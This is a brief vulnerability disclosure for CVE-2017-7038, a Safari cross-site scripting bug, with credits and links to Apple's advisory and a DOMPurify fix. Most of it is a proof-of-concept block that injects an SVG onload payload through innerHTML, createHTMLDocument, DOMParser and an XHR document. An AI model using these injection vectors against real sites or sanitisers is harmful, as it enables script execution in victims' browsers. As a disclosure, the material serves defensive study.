# CVE-2017-7038
Safari XSS (CVE-2017-7038) https://support.apple.com/en-us/HT207923

**Document implementation XSS vulnerability**

```
var payload = '<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>';

document.createElement('body').innerHTML = payload;

document.implementation.createHTMLDocument().write(payload);

new DOMParser().parseFromString(payload, 'text/html');

var xhr = new XMLHttpRequest;
xhr.responseType='document'
xhr.open('GET', 'data:text/html,', false);
xhr.send(null);
xhr.response.body.innerHTML=payload;
```

Authors: [@ansjdnakjdnajkd](https://twitter.com/ansjdnakjdnajkd) and [@ShikariSenpai](https://twitter.com/ShikariSenpai)

Thanks and fix also at https://github.com/cure53/DOMPurify/releases/tag/0.8.7
